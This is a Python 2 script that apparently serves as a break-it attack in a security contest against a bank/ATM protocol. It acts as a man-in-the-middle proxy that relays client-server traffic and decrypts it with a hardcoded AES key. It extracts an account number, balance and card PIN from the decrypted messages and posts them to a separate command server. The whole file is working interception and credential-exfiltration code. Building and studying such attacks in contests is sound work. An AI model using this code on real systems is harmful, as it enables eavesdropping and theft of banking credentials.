#!/usr/bin/env python2
from __future__ import print_function
import traceback
import random
import socket
import argparse
import threading
import signal
import sys
from contextlib import contextmanager

import json
from Crypto.Cipher import AES
from base64 import b64encode, b64decode
import requests

running = True
verbose = True
json_msg = None

CLIENT2SERVER = 1
SERVER2CLIENT = 2

def decode_json(input):
  global json_msg
  cipher = AES.new("test*12345678912", AES.MODE_CBC,"1111111111111111")
  padded = cipher.decrypt(b64decode(input))
  last_char = padded[-1]
  while padded[-1] == last_char:
    padded = padded[:-1]
  msg = padded.decode('utf-8')
  print(msg,file=sys.stderr)
  json_msg = json.loads(msg)

def mitm(buff, direction):
  hb = buff
  if direction == CLIENT2SERVER:
    decode_json(buff)
    pass
  elif direction == SERVER2CLIENT:
    decode_json(buff)
    pass
  return hb

@contextmanager
def ignored(*exceptions):
  try:
    yield
  except exceptions:
    pass 

def killpn( a, b, n):
  if n != CLIENT2SERVER:
    killp( a, b)

def killp(a, b):
  with ignored(Exception):
    a.shutdown(socket.SHUT_RDWR)
    a.close()
    b.shutdown(socket.SHUT_RDWR)
    b.close()
  return

def worker(client, server, n):
  while running == True:
    b = ""
    with ignored(Exception):
      b = client.recv(4096)
    if len(b) == 0:
      killpn(client,server,n)
      return
    try:
      b = mitm(b,n)
    except Exception as e:
      print(e,file=sys.stderr)
    try:
      if b != None:
        server.send(b)
    except:
      killpn(client,server,n)
      return
  killp(client,server)
  return

def signalhandler(sn, sf):
  running = False
  doCommandServerCommunication(args.c, args.d)

def doProxyMain(port, remotehost, remoteport):
  signal.signal(signal.SIGTERM, signalhandler)
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    workers = []
    while running == True:
      k,a = s.accept()
      v = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      v.connect((remotehost, remoteport))
      t1 = threading.Thread(target=worker, args=(k,v,CLIENT2SERVER))
      t2 = threading.Thread(target=worker, args=(v,k,SERVER2CLIENT))
      t2.start()
      t1.start()
      workers.append((t1,t2,k,v))
  except KeyboardInterrupt:
    signalhandler(None, None)
  for t1,t2,k,v in workers:
    killp(k,v)
    t1.join()
    t2.join()
  return


def sendToCommandServer(address, port, request):
    r = requests.post("http://%s:%d" % (address, port), data={"REQUEST": request})
    response = json.loads(r.text)
    return response['success']


def doCommandServerCommunication(command_address, command_port):
  if not json_msg is None:
    sendToCommandServer(command_address, command_port,json.dumps({"type":"learned","variable":"amount","secret":json_msg['initial_balance']}))
    sendToCommandServer(command_address, command_port,json.dumps({"type":"learned","variable":"account","secret":json_msg['account']}))
    card_content = {"pin":json_msg['card_pin'], "account":json_msg['account']}
    b64_content = b64encode(json.dumps(card_content))
    sendToCommandServer(command_address, command_port,json.dumps({"type":"card_contents","card_file":"%s.card" % json_msg['account'] ,"content":b64_content}))
    sendToCommandServer(command_address, command_port,json.dumps({"type":"done"}))


if __name__ == '__main__':
  parser = argparse.ArgumentParser(description='Proxy')
  parser.add_argument('-p', type=int, default=4000, help="listen port")
  parser.add_argument('-s', type=str, default="127.0.0.1", help="server ip address")
  parser.add_argument('-q', type=int, default=3000, help="server port")
  parser.add_argument('-c', type=str, default="127.0.0.1", help="command server")
  parser.add_argument('-d', type=int, default=5000, help="command port")
  args = parser.parse_args()
  print('started\n')
  sys.stdout.flush()
  doProxyMain(args.p, args.s, args.q)
  doCommandServerCommunication(args.c, args.d)

